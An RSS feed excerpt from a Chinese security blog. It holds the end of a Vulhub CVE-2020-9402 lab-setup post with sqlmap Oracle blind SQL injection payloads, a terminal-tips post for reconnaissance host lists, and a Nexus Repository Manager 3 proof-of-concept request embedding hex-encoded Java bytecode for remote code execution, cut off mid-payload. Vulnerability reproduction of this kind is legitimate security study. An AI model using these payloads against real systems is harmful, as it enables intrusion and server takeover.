-Listening on: &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;DESCRIPTION&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;ADDRESS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PROTOCOL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;tcp&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;HOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;b32b16e34b6c&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1521&lt;span class=&quot;o&quot;&gt;)))&lt;/span&gt;
-
-Connecting to &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;DESCRIPTION&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;ADDRESS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PROTOCOL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;HOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;b32b16e34b6c&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1521&lt;span class=&quot;o&quot;&gt;)))&lt;/span&gt;
-STATUS of the LISTENER
-&lt;span class=&quot;nt&quot;&gt;------------------------&lt;/span&gt;
-Alias                     LISTENER
-Version                   TNSLSNR &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Linux: Version 12.1.0.2.0 - Production
-Start Date                11-SEP-2020 06:54:05
-Uptime                    0 days 0 hr. 0 min. 0 sec
-Trace Level               off
-Security                  ON: Local OS Authentication
-SNMP                      OFF
-Listener Parameter File   /u01/app/oracle/product/12.1.0.2/dbhome_1/network/admin/listener.ora
-Listener Log File         /u01/app/oracle/diag/tnslsnr/b32b16e34b6c/listener/alert/log.xml
-Listening Endpoints Summary...
-  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;DESCRIPTION&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;ADDRESS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PROTOCOL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;tcp&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;HOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;b32b16e34b6c&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1521&lt;span class=&quot;o&quot;&gt;)))&lt;/span&gt;
-The listener supports no services
-The &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;completed successfully
-Copying database files
-1% &lt;span class=&quot;nb&quot;&gt;complete
-&lt;/span&gt;3% &lt;span class=&quot;nb&quot;&gt;complete
-&lt;/span&gt;11% &lt;span class=&quot;nb&quot;&gt;complete
-&lt;/span&gt;18% &lt;span class=&quot;nb&quot;&gt;complete&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;数据库服务似乎已经启动起来了，但是数据库文件还在复制过程中：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Copying database files&lt;/code&gt;，那就等待文件复制完成试试看是不是复制文件的行为。&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;100% &lt;span class=&quot;nb&quot;&gt;complete
-&lt;/span&gt;Look at the log file &lt;span class=&quot;s2&quot;&gt;&quot;/u01/app/oracle/cfgtoollogs/dbca/orcl/orcl.log&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;further details.
-
-LSNRCTL &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Linux: Version 12.1.0.2.0 - Production on 11-SEP-2020 07:00:33
-
-Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 1991, 2014, Oracle.  All rights reserved.
-
-Connecting to &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;DESCRIPTION&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;ADDRESS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PROTOCOL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;HOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;b32b16e34b6c&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1521&lt;span class=&quot;o&quot;&gt;)))&lt;/span&gt;
-The &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;completed successfully
-Database has been created &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; /u01/app/oracle/oradata/orcl
-SYS and SYSTEM passwords are &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;oracle]
-Setting HTTP port to 8080
-
-PL/SQL procedure successfully completed.
-
-Please login to http://&amp;lt;ip_address&amp;gt;:8080/em to use enterprise manager
-User: sys&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Password oracle&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Sysdba: &lt;span class=&quot;nb&quot;&gt;true
-&lt;/span&gt;Fixing permissions...
-Running init scripts...
-Init scripts &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; /oracle.init.d/: Ignoring /oracle.init.d/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
-
-Done with scripts we are ready to go
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;难道是因为db的原因导致web服务报错，而且恰好报错是oracle数据库的错，而又恰好我们看日志时是存在这样的情况的。返回去在看web虚拟机的日志，果然：db虚拟机数据库文件拷贝完成后，这边web虚拟机重启后启动服务就没有报错了，服务跑在8000端口。&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;+ &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /usr/src
-+ wait-for-it.sh &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 0 db:1521 &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'oracle is up'&lt;/span&gt;
-wait-for-it.sh: waiting &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;db:1521 without a &lt;span class=&quot;nb&quot;&gt;timeout
-&lt;/span&gt;wait-for-it.sh: db:1521 is available after 0 seconds
-oracle is up
-+ python manage.py makemigrations
-Migrations &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'vuln'&lt;/span&gt;:
-  vuln/migrations/0001_initial.py
-    - Create model Names
-    - Create model Collection
-    - Create model Collection2
-+ python manage.py migrate
-Operations to perform:
-  Apply all migrations: admin, auth, contenttypes, sessions, vuln
-Running migrations:
-  Applying contenttypes.0001_initial... OK
-  Applying auth.0001_initial... OK
-  Applying admin.0001_initial... OK
-  Applying admin.0002_logentry_remove_auto_add... OK
-  Applying admin.0003_logentry_add_action_flag_choices... OK
-  Applying contenttypes.0002_remove_content_type_name... OK
-  Applying auth.0002_alter_permission_name_max_length... OK
-  Applying auth.0003_alter_user_email_max_length... OK
-  Applying auth.0004_alter_user_username_opts... OK
-  Applying auth.0005_alter_user_last_login_null... OK
-  Applying auth.0006_require_contenttypes_0002... OK
-  Applying auth.0007_alter_validators_add_error_messages... OK
-  Applying auth.0008_alter_user_username_max_length... OK
-  Applying auth.0009_alter_user_last_name_max_length... OK
-  Applying auth.0010_alter_group_name_max_length... OK
-  Applying auth.0011_update_proxy_permissions... OK
-  Applying sessions.0001_initial... OK
-  Applying vuln.0001_initial... OK
-+ python manage.py loaddata collection.json
-Installed 8 object&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; from 1 fixture&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-+ python manage.py shell &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'from django.contrib.auth.models import User; User.objects.create_superuser('&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'admin'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;', '&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'admin@vulhub.org'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;', '&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'admin'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;') if not User.objects.filter(username='&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'admin'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;').exists() else 0'&lt;/span&gt;
-+ &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;python manage.py runserver 0.0.0.0:8000
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;h2 id=&quot;令人失望的结果&quot;&gt;#令人失望的结果&lt;/h2&gt;
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exec python manage.py runserver 0.0.0.0:8000&lt;/code&gt;看到这个日志打印出来，觉得好像确实没有什么问题了，再来查看一下docker的状态。&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bin4xin@bin4xin&lt;span class=&quot;s1&quot;&gt;'s MacbookPro CVE-2020-9402 % docker-compose ps
-       Name                      Command               State              Ports            
--------------------------------------------------------------------------------------------
-cve-2020-9402_db_1    /entrypoint.sh                   Up      1521/tcp, 5500/tcp, 8080/tcp
-cve-2020-9402_web_1   /docker-entrypoint.sh pyth ...   Up      0.0.0.0:8000-&amp;gt;8000/tcp    
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;看一眼docker的情况，都是up状态。访问一下8000端口终于也可以访问到web服务了，不再是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Empty reply from server&lt;/code&gt;了。&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bin4xin@bin4xin&lt;span class=&quot;s1&quot;&gt;'s MacbookPro CVE-2020-9402 % curl localhost:8000
-&amp;lt;!DOCTYPE html&amp;gt;
-&amp;lt;html lang=&quot;en&quot;&amp;gt;
-&amp;lt;head&amp;gt;
-  &amp;lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=utf-8&quot;&amp;gt;
-  &amp;lt;title&amp;gt;Page not found at /&amp;lt;/title&amp;gt;
-  &amp;lt;meta name=&quot;robots&quot; content=&quot;NONE,NOARCHIVE&quot;&amp;gt;
-  &amp;lt;style type=&quot;text/css&quot;&amp;gt;
-    html * { padding:0; margin:0; }
-    body * { padding:10px 20px; }
-    body * * { padding:0; }
-    body { font:small sans-serif; background:#eee; color:#000; }
-    body&amp;gt;div { border-bottom:1px solid #ddd; }
-    h1 { font-weight:normal; margin-bottom:.4em; }
-    h1 span { font-size:60%; color:#666; font-weight:normal; }
-    table { border:none; border-collapse: collapse; width:100%; }
-    td, th { vertical-align:top; padding:2px 3px; }
-    th { width:12em; text-align:right; color:#666; padding-right:.5em; }
-    #info { background:#f6f6f6; }
-    #info ol { margin: 0.5em 4em; }
-    #info ol li { font-family: monospace; }
-    #summary { background: #ffc; }
-    #explanation { background:#eee; border-bottom: 0px none; }
-  &amp;lt;/style&amp;gt;
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;web访问日志：&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Watching &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;file changes with StatReloader
-Not Found: /
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;11/Sep/2020 07:01:23] &lt;span class=&quot;s2&quot;&gt;&quot;GET / HTTP/1.1&quot;&lt;/span&gt; 404 2137
-
-Not Found: /
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;11/Sep/2020 07:06:47] &lt;span class=&quot;s2&quot;&gt;&quot;GET / HTTP/1.1&quot;&lt;/span&gt; 404 2141
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
-Parameter: q &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GET&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-    Type: boolean-based blind
-    Title: Oracle boolean-based blind - Parameter replace
-    Payload: &lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=(&lt;/span&gt;SELECT &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CASE WHEN &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;6457&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;6457&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; THEN 6457 ELSE CAST&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 AS INT&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;/&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SELECT 0 FROM DUAL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; END&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; FROM DUAL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-
-    Type: time-based blind
-    Title: Oracle time-based blind - Parameter replace &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;DBMS_PIPE.RECEIVE_MESSAGE&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-    Payload: &lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=(&lt;/span&gt;SELECT &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CASE WHEN &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;6135&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;6135&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; THEN DBMS_PIPE.RECEIVE_MESSAGE&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CHR&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;83&lt;span class=&quot;o&quot;&gt;)||&lt;/span&gt;CHR&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;74&lt;span class=&quot;o&quot;&gt;)||&lt;/span&gt;CHR&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;88&lt;span class=&quot;o&quot;&gt;)||&lt;/span&gt;CHR&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;115&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,5&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ELSE 6135 END&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; FROM DUAL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;15:22:11] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] the back-end DBMS is Oracle
-back-end DBMS: Oracle
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-</description>
-        <pubDate>Fri, 11 Sep 2020 00:00:00 +0800</pubDate>
-        <link> https://www.sentrylab.cn/blog/2020/docker/vuln/problems/</link>
-        <guid isPermaLink="true">/blog/2020/docker/vuln/problems/</guid>
-        
-        
-        <category>blog</category>
-        
-        <category>docker</category>
-        
-        <category>技巧</category>
-        
-        <category>Vulnhub</category>
-        
-        <category>笔记</category>
-        
-      </item>
-    
-      <item>
-        <title>blog: 「技巧」：linux&amp;unix Terminal小技巧</title>
-        <description>&lt;h1 id=&quot;grep&quot;&gt;grep&lt;/h1&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;grep -n “get_spg2lsf” -r ./&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;在当前文件夹下查找包含”get_spg2lsf”字符串的文件&lt;/p&gt;
-
-&lt;h1 id=&quot;vim&quot;&gt;vim&lt;/h1&gt;
-
-&lt;h3 id=&quot;快速删除&quot;&gt;快速删除&lt;/h3&gt;
-&lt;p&gt;1、删除每行前10个字符：&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;:%s/^.{10}//&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;其中，%表示所有行，s表示替换，”%s”可用”1,$”代替（下同）；&lt;/p&gt;
-
-&lt;p&gt;正则表达式”/^.{10}//”中，^表示行首；”.”表示要删除的字符个数，”.{10}“表示删除10个字符，可用10个”.”表示；&lt;/p&gt;
-
-&lt;p&gt;2、删除每行后10个字符&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;:%s/.{10}$//&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h3 id=&quot;字符串替换&quot;&gt;字符串替换&lt;/h3&gt;
-&lt;p&gt;vi/vim 中可以使用 :s 命令来替换字符串。&lt;/p&gt;
-
-&lt;p&gt;　　:s/vivian/sky/ 替换当前行第一个 vivian 为 sky&lt;/p&gt;
-
-&lt;p&gt;　　:s/vivian/sky/g 替换当前行所有 vivian 为 sky&lt;/p&gt;
-
-&lt;p&gt;　　:n,$s/vivian/sky/ 替换第 n 行开始到最后一行中每一行的第一个 vivian 为 sky&lt;/p&gt;
-
-&lt;p&gt;　　:n,$s/vivian/sky/g 替换第 n 行开始到最后一行中每一行所有 vivian 为 sky&lt;/p&gt;
-
-&lt;h1 id=&quot;awk&quot;&gt;awk&lt;/h1&gt;
-&lt;p&gt;在实际信息搜集过程中遇到的问题：&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;现在有一个hosts文件，其中包含了所需要信息搜集的域名和ip地址，其格式如下存储：
-domain.com.cn,1.1.1.1&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;首先按照信息搜集的方式第一步我是先过一遍ip或域名的端口，所以问题就来了。
-nmap不支持这种形式进行文件内容读取，需以一行一数据的形式，就是：&lt;/p&gt;
-&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;domain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;com&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cn1&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;ip1&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;domain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;com&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cn2&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;ip2&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;不管是域名还是ip地址都是以这样的形式来读取才能使用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-iL&lt;/code&gt;参数来读取指定的域名或ip，最后实现我们的端口扫描任务，所以是需要以逗号为界限，将两列数据分成两个文件；&lt;/p&gt;
-
-&lt;p&gt;故我们构思一下思路：以逗号为标示，把前面一列和后面一列分别使用参数$1，$2来表示，将$1输出到domain1.txt，$2输出到domain2.txt中。&lt;/p&gt;
-
-</description>
-        <pubDate>Tue, 01 Sep 2020 00:00:00 +0800</pubDate>
-        <link> https://www.sentrylab.cn/blog/2020/use/vim/in/linux/</link>
-        <guid isPermaLink="true">/blog/2020/use/vim/in/linux/</guid>
-        
-        
-        <category>blog</category>
-        
-        <category>笔记</category>
-        
-        <category>BASH</category>
-        
-        <category>信息搜集</category>
-        
-      </item>
-    
-      <item>
-        <title>blog: 「Src」：Nexus-Repository-Manager3-漏洞复现总结</title>
-        <description>&lt;p&gt;只是简单记录一下关于这个管理软件的poc代码；&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /service/extdirect HTTP/1.1
-Host: vuln_ip
-sUser-Agent: Mozilla/5.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Macintosh&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Intel Mac OS X 10.15&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; rv:79.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Gecko/20100101 Firefox/79.0
-Accept: text/html,application/xhtml+xml,application/xml&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.9,image/webp,&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.8
-Accept-Language: zh-CN,zh&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.8,zh-TW&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.7,zh-HK&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.5,en-US&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.3,en&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.2
-Accept-Encoding: &lt;span class=&quot;nb&quot;&gt;gzip&lt;/span&gt;, deflate
-Connection: close
-Upgrade-Insecure-Requests: 1
-Content-Type: application/json&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;UTF-8
-Content-Length: 7249
-
-&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;action&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;coreui_Component&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;type&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;rpc&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;tid&quot;&lt;/span&gt;: 8, &lt;span class=&quot;s2&quot;&gt;&quot;data&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;[{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;sort&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;[{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;direction&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;ASC&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;property&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}]&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;start&quot;&lt;/span&gt;: 0, &lt;span class=&quot;s2&quot;&gt;&quot;filter&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;[{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;property&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;repositoryName&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;value&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;*&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;property&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;expression&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;value&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;function(x, y, z, c, integer, defineClass){   c=1.class.forName('java.lang.Character');   integer=1.class;   x='CAFEBABE0000003100AE0A001F00560A005700580A005700590A005A005B0A005A005C0A005D005E0A005D005F0700600A000800610A006200630700640800650A001D00660800410A001D00670A006800690A0068006A08006B08004508006C08006D0A006E006F0A006E00700A001F00710A001D00720800730A000800740800750700760A001D00770700780A0079007A08007B08007C07007D0A0023007E0A0023007F0700800100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100124C6F63616C5661726961626C655461626C65010004746869730100114C4578706C6F69742F546573743233343B01000474657374010015284C6A6176612F6C616E672F537472696E673B29560100036F626A0100124C6A6176612F6C616E672F4F626A6563743B0100016901000149010003636D640100124C6A6176612F6C616E672F537472696E673B01000770726F636573730100134C6A6176612F6C616E672F50726F636573733B01000269730100154C6A6176612F696F2F496E70757453747265616D3B010006726573756C740100025B42010009726573756C745374720100067468726561640100124C6A6176612F6C616E672F5468726561643B0100056669656C640100194C6A6176612F6C616E672F7265666C6563742F4669656C643B01000C7468726561644C6F63616C7301000E7468726561644C6F63616C4D61700100114C6A6176612F6C616E672F436C6173733B01000A7461626C654669656C640100057461626C65010005656E74727901000A76616C75654669656C6401000E68747470436F6E6E656374696F6E01000E48747470436F6E6E656374696F6E0100076368616E6E656C01000B487474704368616E6E656C010008726573706F6E7365010008526573706F6E73650100067772697465720100154C6A6176612F696F2F5072696E745772697465723B0100164C6F63616C5661726961626C65547970655461626C650100144C6A6176612F6C616E672F436C6173733C2A3E3B01000A457863657074696F6E7307008101000A536F7572636546696C6501000C546573743233342E6A6176610C002700280700820C008300840C008500860700870C008800890C008A008B07008C0C008D00890C008E008F0100106A6176612F6C616E672F537472696E670C002700900700910C009200930100116A6176612F6C616E672F496E74656765720100106A6176612E6C616E672E5468726561640C009400950C00960097070098